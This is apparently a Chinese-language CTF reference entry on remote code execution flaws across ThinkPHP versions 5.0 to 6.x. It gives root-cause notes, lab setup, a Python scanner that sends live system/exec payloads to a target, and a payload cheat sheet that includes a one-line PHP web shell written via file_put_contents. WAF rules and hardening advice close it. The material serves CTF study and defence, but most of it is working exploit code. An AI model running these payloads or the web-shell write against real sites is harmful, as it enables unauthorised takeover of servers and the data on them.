---
category: "框架RCE/PHP框架"
tags: ["ThinkPHP", "RCE", "CTF高频", "中国CTF", "PHP", "反序列化", "变量覆盖"]
difficulty: "入门"
cve: "多个CVE (详见内文)"
cvss: "9.8"
affected: "ThinkPHP 5.0.x / 5.1.x / 5.2.x / 6.x 各版本系列漏洞"
poc_available: true
---

# ThinkPHP多版本RCE漏洞系列
> **多CVE** | **CVSS 9.8** | **中国CTF最高频漏洞之一**

## 1. 概述

### 漏洞系列一览

| ThinkPHP版本 | 漏洞类型 | 触发路径 | CTF出现频率 |
|-------------|---------|---------|------------|
| 5.0.x < 5.0.24 | 变量覆盖RCE | `?s=index/\think\app/invokefunction` | 极高 |
| 5.0.x < 5.0.24 | 缓存RCE | 缓存写入+包含 | 高 |
| 5.1.x < 5.1.31 | 变量覆盖RCE | `?s=index/\think\Request/input` | 高 |
| 5.2.x | 多种RCE | 路由+Request | 中 |
| 6.x < 6.0.2 | 反序列化RCE | Session驱动+unserialize | 高 |
| 5.x | SQL注入 | 聚合查询 | 中 |
| 5.0.x | 日志包含RCE | Error日志+LFI | 中 |

### CTF中的应用形式
- **中国CTF超高频**: ThinkPHP是中国最流行的PHP框架，漏洞在CTF中频繁出现
- **典型场景**: 发现ThinkPHP站点后直接尝试各版本RCE payload
- **组合利用**: 多种ThinkPHP漏洞组合（如变量覆盖->缓存文件->LFI）
- **代码审计**: 通常提供源码，需要在ThinkPHP框架中找到利用链

## 2. 漏洞原理

### 2.1 ThinkPHP 5.0.x 变量覆盖RCE

```php
// 核心问题在 app/App.php 或 路由处理中
// 5.0.x < 5.0.24 版本

// 1. 路由解析: 攻击者控制的URL被解析为模块/控制器/方法
// ?s=index/think\app/invokefunction&function=call_user_func_array&...

// 2. App::module() 中
// 通过反射调用任意控制器的任意方法，参数完全可控
// 可以将恶意参数传递给 call_user_func_array 等危险函数

// 3. 核心代码 (简化)
// lib/App.php: module()
$dispatch = $this->routeCheck();  // 路由解析
$module = $dispatch['module'];    // index
$controller = $dispatch['controller'];  // think\app
$action = $dispatch['action'];    // invokefunction

// 通过反射调用
$reflect = new \ReflectionMethod($instance, $action);
// 传入用户可控参数
return $reflect->invokeArgs($instance, $args);
```

### 2.2 ThinkPHP 5.1.x 变量覆盖RCE

```php
// 5.1.x < 5.1.31
// 关键类: think\Request
// 利用 input() 方法的 filter 参数实现RCE

// 触发:
// POST: ?s=captcha
// POST data: _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
```

### 2.3 ThinkPHP 6.x 反序列化RCE

```php
// ThinkPHP 6.x < 6.0.2
// 通过Session反序列化触发
// Session驱动将序列化数据存储在文件中
// 利用反序列化Gadget链实现RCE

// 关键类: 
// think\process\pipes\Windows -> __destruct -> __removeFiles
// think\model\concern\Conversion -> __toString
// think\model\concern\Attribute -> getAttr
```

## 3. 环境搭建

```bash
# ThinkPHP 5.0.x 漏洞环境
docker pull vulfocus/thinkphp-5.0.23-rce:latest
docker run -d -p 8080:8080 --name tp5-vuln vulfocus/thinkphp-5.0.23-rce:latest

# ThinkPHP 5.1.x 漏洞环境
docker pull vulfocus/thinkphp-5.1.29-rce:latest
docker run -d -p 8081:8080 --name tp51-vuln vulfocus/thinkphp-5.1.29-rce:latest

# ThinkPHP 6.x 环境
docker pull vulfocus/thinkphp-6.0.1-rce:latest
docker run -d -p 8082:8080 --name tp6-vuln vulfocus/thinkphp-6.0.1-rce:latest

# 离线准备
docker save vulfocus/thinkphp-5.0.23-rce:latest -o tp5-vuln.tar
```

## 4. POC/EXP

### 4.1 多版本综合检测脚本 (Python)

```python
#!/usr/bin/env python3
"""
ThinkPHP 多版本RCE漏洞检测工具
覆盖版本: 5.0.x / 5.1.x / 5.2.x / 6.x

检测方式:
1. ThinkPHP框架指纹识别
2. 版本精确检测
3. 各版本对应RCE检测
4. 不执行恶意操作，仅验证漏洞存在
"""

import requests
import re
import random
import string
import time
import argparse
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 10
USER_AGENT = "ThinkPHP-Detector/3.0"


class ThinkPHPDector:
    """ThinkPHP多版本漏洞检测器"""

    def __init__(self, target, verbose=False, proxy=None):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": USER_AGENT})
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.version = None
        self.vulnerabilities = []

    def log(self, msg, level="INFO"):
        levels = {"INFO": "[*]", "GOOD": "[+]", "VULN": "[!!!]", "WARN": "[!]", "BAD": "[-]"}
        if level in ("VULN", "GOOD", "WARN") or self.verbose:
            print(f"{levels.get(level, '[*]')} {msg}")

    # ===== 指纹识别 =====
    def thinkphp_fingerprint(self):
        """ThinkPHP框架指纹识别"""
        fingerprints = []

        try:
            resp = self.session.get(self.target, timeout=TIMEOUT)

            # 指纹1: 页面内TP版本信息
            tp_indicators = [
                "ThinkPHP",
                "thinkphp",
                "TP_VERSION",
                "VERSION",
                "/index.php",  # ThinkPHP默认入口
                "__ROOT__",
                "ThinkTemplate",
                "think_view",
            ]
            for ind in tp_indicators:
                if ind in resp.text:
                    fingerprints.append(ind)
                    self.log(f"ThinkPHP指纹: {ind}", "GOOD")

            # 指纹2: Header信息
            for key in ["X-Powered-By"]:
                if "ThinkPHP" in resp.headers.get(key, ""):
                    fingerprints.append(key)
        except:
            pass

        # 指纹3: 特定错误路径
        tp_error_paths = [
            "/index.php?s=index",
            "/index.php?s=admin",
            "/index.php?c=index&a=index",
            "/?s=index",
        ]
        for path in tp_error_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if "ThinkPHP" in resp.text:
                    fingerprints.append(f"path:{path}")
            except:
                pass

        return len(fingerprints) > 0

    def version_detection(self):
        """ThinkPHP版本精确检测"""
        # 方法1: 通过页面版权信息
        try:
            resp = self.session.get(self.target, timeout=TIMEOUT)
            patterns = [
                r'ThinkPHP\s+V([\d.]+)',
                r'V([\d.]+)\s*[<\s]*ThinkPHP',
                r'"version":\s*"([\d.]+)"',  # TP6 composer.json
                r'THINK_VERSION\s*=\s*\'([\d.]+)\'',
            ]

            for pattern in patterns:
                match = re.search(pattern, resp.text, re.IGNORECASE)
                if match:
                    version = match.group(1)
                    self.log(f"检测到ThinkPHP版本: {version}", "GOOD")
                    self.version = version
                    return version
        except:
            pass

        # 方法2: 通过特定路径响应差异判断版本
        version_results = {}
        
        # TP5.0 特征路径
        try:
            resp = self.session.get(
                f"{self.target}/index.php?s=index/index/index",
                timeout=5
            )
            if "ThinkPHP" in resp.text or resp.status_code == 200:
                version_results["tp5"] = True
        except:
            pass

        # TP5.1 特征路径
        try:
            resp = self.session.get(
                f"{self.target}/index.php?s=index/think\request/input",
                timeout=5
            )
            if "method" in resp.text or "filter" in resp.text:
                version_results["tp51"] = True
        except:
            pass

        # TP6 特征路径 (多应用模式)
        try:
            resp = self.session.get(
                f"{self.target}/index.php?s=index",
                timeout=5
            )
            if "app" in resp.text.lower():
                version_results["tp6"] = True
        except:
            pass

        self.log(f"版本特征: {version_results}", "INFO")
        return "unknown"

    # ===== TP 5.0.x 检测 (< 5.0.24) =====
    def test_tp50_method_invoke(self):
        """
        TP5.0 核心RCE: 通过s参数调用任意方法
        
        Payload: ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
        """
        payloads = [
            # Payload 1: 通过 invokefunction 调用 phpinfo
            "/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",
            # Payload 2: 通过 invokefunction 调用系统函数
            "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
            # Payload 3: 不经过路由
            "/?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",
            # Payload 4: 使用namespace
            "/?s=index/\\think\\app/invokefunction&function=system&vars[0]=id",
        ]

        results = []
        for i, payload in enumerate(payloads):
            url = f"{self.target}{payload}"
            try:
                resp = self.session.get(url, timeout=TIMEOUT)
                
                # 检查phpinfo输出特征
                if "phpinfo" in resp.text.lower() or "PHP Version" in resp.text:
                    self.log(f"TP5.0 RCE确认! Payload {i+1}", "VULN")
                    results.append({
                        "version": "5.0.x",
                        "type": "method_invoke",
                        "payload_idx": i+1,
                        "evidence": "phpinfo output detected"
                    })
                    break

                # 检查system输出
                if "uid=" in resp.text or "gid=" in resp.text or "root" in resp.text:
                    self.log(f"TP5.0 RCE确认! System output detected", "VULN")
                    results.append({
                        "version": "5.0.x", 
                        "type": "method_invoke",
                        "payload_idx": i+1,
                        "evidence": "command output detected"
                    })
                    break

                if resp.status_code == 200 and len(resp.text) > 100:
                    self.log(f"Payload {i+1}: HTTP 200, 响应长度 {len(resp.text)}", "INFO")

            except requests.exceptions.Timeout:
                # 超时可能表明命令正在执行
                self.log(f"Payload {i+1}: 超时 (可能正在执行命令)", "WARN")
            except Exception as e:
                pass

        return results

    # ===== TP5.0.x 缓存RCE =====
    def test_tp50_cache_rce(self):
        """
        TP5.0 缓存写入RCE
        
        利用链: 
        1. 通过路由漏洞向缓存文件写入PHP代码
        2. 包含缓存文件获取RCE
        """
        # 检查缓存文件是否可能包含PHP代码
        cache_paths = [
            "/runtime/cache/",
            "/runtime/temp/",
            "/data/cache/",
            "/data/runtime/cache/",
        ]

        accessible = []
        for path in cache_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if resp.status_code == 200:
                    self.log(f"缓存目录可能可访问: {path}", "WARN")
                    accessible.append(path)
            except:
                pass

        return accessible

    # ===== TP5.1.x 检测 (< 5.1.31) =====
    def test_tp51_request_rce(self):
        """
        TP5.1 Request类 RCE
        
        POST /index.php?s=captcha
        _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1
        """
        captcha_path = "/index.php?s=captcha"

        payloads = [
            # Payload 1: phpinfo 验证
            {
                "url": f"{self.target}{captcha_path}",
                "method": "POST",
                "data": {
                    "_method": "__construct",
                    "filter[]": "phpinfo",
                    "method": "get",
                    "server[REQUEST_METHOD]": "1",
                }
            },
            # Payload 2: 使用system
            {
                "url": f"{self.target}{captcha_path}",
                "method": "POST",
                "data": {
                    "_method": "__construct",
                    "filter[]": "system",
                    "method": "get",
                    "server[REQUEST_METHOD]": "id",
                }
            },
            # Payload 3: 不通过captcha, 通过index
            {
                "url": f"{self.target}/index.php?s=index/index/index",
                "method": "POST",
                "data": {
                    "_method": "__construct",
                    "filter[]": "phpinfo",
                    "method": "get",
                    "server[REQUEST_METHOD]": "1",
                }
            },
            # Payload 4: 新格式
            {
                "url": f"{self.target}/index.php?s=index/\\think\\Request/input",
                "method": "POST",
                "data": {
                    "_method": "__construct",
                    "filter": "system",
                    "method": "get",
                    "data": "id",
                    "server[REQUEST_METHOD]": "id",
                }
            },
        ]

        results = []
        for i, req in enumerate(payloads):
            try:
                if req["method"] == "POST":
                    resp = self.session.post(
                        req["url"],
                        data=req["data"],
                        timeout=TIMEOUT,
                        allow_redirects=False
                    )
                else:
                    resp = self.session.get(
                        req["url"],
                        params=req["data"],
                        timeout=TIMEOUT
                    )

                # 检查结果
                if "PHP Version" in resp.text or "phpinfo()" in resp.text:
                    self.log(f"TP5.1 RCE确认! Payload {i+1} (phpinfo)", "VULN")
                    results.append({
                        "version": "5.1.x",
                        "type": "request_filter",
                        "payload_idx": i+1,
                        "evidence": "phpinfo output"
                    })
                    break

                if "uid=" in resp.text or "gid=" in resp.text:
                    self.log(f"TP5.1 RCE确认! Payload {i+1} (command output)", "VULN")
                    results.append({
                        "version": "5.1.x",
                        "type": "request_filter",
                        "payload_idx": i+1,
                        "evidence": "command output"
                    })
                    break

                if resp.status_code == 200 and len(resp.text) > 0:
                    self.log(f"Payload {i+1}: HTTP 200, len={len(resp.text)}", "INFO")

            except Exception as e:
                self.log(f"Payload {i+1} 异常: {e}", "WARN")

        return results

    # ===== TP6.x 检测 =====
    def test_tp6_session_rce(self):
        """
        TP6.x Session反序列化RCE
        
        需要写入含有恶意序列化数据的session文件
        然后通过包含session文件触发反序列化
        这里仅检测session配置是否可被利用
        """
        # Step 1: 检查session是否启用且配置可预测
        try:
            resp = self.session.get(
                f"{self.target}/index.php?s=index",
                timeout=5,
                allow_redirects=False
            )
            cookies = self.session.cookies.get_dict()
            
            # ThinkPHP使用PHPSESSID作为Session ID
            if "PHPSESSID" in cookies:
                self.log(f"检测到Session ID: {cookies['PHPSESSID']}", "GOOD")
                
                # 尝试通过session写入点
                session_write_paths = [
                    "/index.php?s=index/index/test_write",
                ]
                for path in session_write_paths:
                    try:
                        resp = self.session.get(
                            f"{self.target}{path}?key=test&value=test123",
                            timeout=5
                        )
                        self.log(f"Session写入测试: {resp.status_code}", "INFO")
                    except:
                        pass
                        
        except Exception as e:
            self.log(f"TP6 Session检测: {e}", "INFO")

        return []

    # ===== 日志包含检测 =====
    def test_log_inclusion(self):
        """
        TP5.0 日志文件包含RCE
        
        利用流程:
        1. 构造恶意请求，使TP记录包含PHP代码的错误日志
        2. 包含日志文件获取RCE
        """
        import random
        test_string = "TEST_INCLUDE_" + "".join(random.choices(string.ascii_lowercase, k=6))

        # Step 1: 触发错误日志写入（在URL中包含测试字符串）
        error_payloads = [
            f"/index.php?s={test_string}",
            f"/?s={test_string}",
        ]

        for payload in error_payloads:
            try:
                self.session.get(f"{self.target}{payload}", timeout=5)
            except:
                pass

        # Step 2: 尝试访问可能的日志文件路径
        log_paths = [
            f"/runtime/log/{time.strftime('%Y%m')}/",
            f"/runtime/log/{time.strftime('%Y%m')}/{time.strftime('%d')}.log",
            f"/data/runtime/log/{time.strftime('%Y%m')}.log",
            f"/runtime/log/error.log",
            f"/Application/Runtime/Logs/",
        ]

        found = []
        for path in log_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 0:
                    if test_string in resp.text or "error" in resp.text.lower():
                        self.log(f"日志文件可访问: {path}", "VULN")
                        found.append(path)
            except:
                pass

        # Step 3: 判断日志文件路径模式
        if not found:
            # 尝试通过配置文件获取日志路径
            pass
        else:
            self.log("可能存在日志包含漏洞", "VULN")

        return found

    # ===== 综合检测 =====
    def comprehensive_detect(self):
        """综合检测流程"""
        print(f"""
    ╔══════════════════════════════════════════╗
    ║  ThinkPHP Multi-Version RCE Detector    ║
    ║  5.0.x / 5.1.x / 5.2.x / 6.x          ║
    ║  Chinese CTF High-Freq Vulnerability    ║
    ╚══════════════════════════════════════════╝
    """)
        print(f"[*] 目标: {self.target}")

        results = {
            "is_thinkphp": False,
            "version": "unknown",
            "rce_found": [],
            "log_inclusion": [],
            "cache_accessible": [],
        }

        # Step 1: 框架识别
        print("\n[Step 1] ThinkPHP 框架指纹识别...")
        results["is_thinkphp"] = self.thinkphp_fingerprint()
        if not results["is_thinkphp"]:
            self.log("未检测到ThinkPHP框架特征", "WARN")
            self.log("可能不是ThinkPHP或使用了自定义模板", "INFO")
        else:
            self.log("确认ThinkPHP框架", "GOOD")

        # Step 2: 版本检测
        print("\n[Step 2] 版本检测...")
        results["version"] = self.version_detection()
        self.log(f"检测到版本: {results['version']}")

        # Step 3: 各版本RCE检测
        print("\n[Step 3] 多版本RCE检测...")

        # TP5.0
        print("  [3a] ThinkPHP 5.0.x 方法调用RCE...")
        tp50_results = self.test_tp50_method_invoke()
        if tp50_results:
            results["rce_found"].extend(tp50_results)

        # TP5.0 缓存RCE
        if not tp50_results:
            print("  [3b] ThinkPHP 5.0.x 缓存RCE...")
            results["cache_accessible"] = self.test_tp50_cache_rce()

        # TP5.1
        print("  [3c] ThinkPHP 5.1.x Request RCE...")
        tp51_results = self.test_tp51_request_rce()
        if tp51_results:
            results["rce_found"].extend(tp51_results)

        # TP6
        print("  [3d] ThinkPHP 6.x Session反序列化RCE...")
        self.test_tp6_session_rce()

        # Step 4: 日志包含
        print("\n[Step 4] 日志文件包含检测...")
        results["log_inclusion"] = self.test_log_inclusion()

        # 总结
        print("\n" + "=" * 60)
        print("[综合判定]")
        print(f"  ThinkPHP框架: {'Yes' if results['is_thinkphp'] else 'No'}")
        print(f"  检测到版本: {results['version']}")

        if results["rce_found"]:
            print(f"\n[!!!] 发现RCE漏洞! ({len(results['rce_found'])} 个)")
            for r in results["rce_found"]:
                print(f"  - 版本: {r.get('version')}, 类型: {r.get('type')}")
                print(f"    证据: {r.get('evidence', 'N/A')}")
        else:
            self.log("未检测到直接RCE漏洞", "WARN")

        if results["log_inclusion"]:
            print(f"\n[!] 日志文件可访问 (可能有LFI链)")
            for path in results["log_inclusion"]:
                print(f"  - {path}")

        if results["cache_accessible"]:
            print(f"\n[!] 缓存目录可访问 (可能有缓存写入链)")
            for path in results["cache_accessible"]:
                print(f"  - {path}")

        return results


def main():
    parser = argparse.ArgumentParser(
        description="ThinkPHP 多版本RCE漏洞检测工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
使用示例:
  # 基础检测
  python thinkphp_detector.py -t http://target:8080

  # 详细模式
  python thinkphp_detector.py -t http://target:8080 -v

  # 日志包含深度检测
  python thinkphp_detector.py -t http://target:8080 --check-logs
        """
    )
    parser.add_argument("-t", "--target", required=True, help="目标URL")
    parser.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    parser.add_argument("--check-logs", action="store_true", help="深度检查日志文件")
    parser.add_argument("--proxy", help="HTTP代理")

    args = parser.parse_args()

    detector = ThinkPHPDector(args.target, verbose=args.verbose, proxy=args.proxy)
    results = detector.comprehensive_detect()

    # 额外深度检测
    if args.check_logs and results.get("log_inclusion"):
        print("\n[*] 深度日志包含检测...")
        # 尝试暴力破解日志文件名
        import datetime
        for i in range(1, 32):
            date_str = f"{datetime.datetime.now().strftime('%Y%m')}{i:02d}"
            path = f"/runtime/log/{datetime.datetime.now().strftime('%Y%m')}/{date_str}.log"
            try:
                resp = requests.get(f"{args.target}{path}", timeout=5, verify=False)
                if resp.status_code == 200 and len(resp.text) > 0:
                    print(f"[+] 发现日志: {path} ({len(resp.text)} bytes)")
            except:
                pass


if __name__ == "__main__":
    main()
```

### 4.2 快速Payload库

```python
#!/usr/bin/env python3
"""
ThinkPHP Payload速查表
"""

# ThinkPHP 5.0.x RCE Payloads
TP50_PAYLOADS = {
    "phpinfo": "/?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",
    "system": "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
    "assert": "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
    "file_put_contents": "/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[1]);?>",
    "cache_warmup": "/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
}

# ThinkPHP 5.1.x RCE Payloads
TP51_PAYLOADS = {
    "phpinfo": "POST /index.php?s=captcha\r\n_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1",
    "system": "POST /index.php?s=captcha\r\n_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id",
    "exec": "POST /index.php?s=captcha\r\n_method=__construct&filter[]=exec&method=get&server[REQUEST_METHOD]=id",
    "assert": "POST /index.php?s=captcha\r\n_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=phpinfo()",
}

# ThinkPHP 6.x RCE Gadget Chains
TP6_GADGET = {
    "session_windows": "think\\process\\pipes\\Windows -> __destruct -> removeFiles -> file_exists",
    "model_to_string": "think\\model\\concern\\Conversion -> __toString -> toJson -> toArray",
    "request_input": "think\\Request -> input -> filterValue -> call_user_func",
}

print("ThinkPHP Payload速查表")
print("=" * 60)
print("\n[TP5.0.x]")
for name, payload in TP50_PAYLOADS.items():
    print(f"  {name}: {payload[:80]}...")

print("\n[TP5.1.x]")
for name, payload in TP51_PAYLOADS.items():
    print(f"  {name}: {payload[:80]}...")

print("\n[TP6.x Gadget Chains]")
for name, chain in TP6_GADGET.items():
    print(f"  {name}: {chain}")
```

## 5. 检测与防御

### 5.1 WAF规则

```nginx
# 阻止ThinkPHP RCE payload
if ($args ~* "invokefunction|call_user_func_array") {
    return 403;
}
if ($request_body ~* "_method=__construct&filter") {
    return 403;
}
```

### 5.2 加固方案

1. **升级ThinkPHP**: 升级到最新稳定版
2. **关闭调试模式**: `APP_DEBUG` 设为 `false`
3. **限制危险函数**: php.ini 中 `disable_functions = system,exec,passthru,shell_exec,proc_open,popen`
4. **使用WAF**: 部署规则的Web防火墙

## 6. 相关知识点

### 6.1 CTF解题思路

1. **识别框架版本** -> 通过错误页面、版权信息、路径特征
2. **选择对应Payload** -> 5.0用invokefunction, 5.1用Request input
3. **如果RCE被拦截** -> 尝试日志包含、缓存文件、文件写入等方法
4. **绕过disable_functions** -> LD_PRELOAD, FFI, COM等

### 6.2 其他PHP框架RCE对比

| 框架 | 漏洞类型 | CTF频率 |
|------|---------|---------|
| ThinkPHP | 变量覆盖/反序列化 | 极高 |
| Laravel | 反序列化链/Cookie解密 | 中 |
| Yii2 | 反序列化链 | 中 |
| CodeIgniter | SQL注入/RCE | 低 |
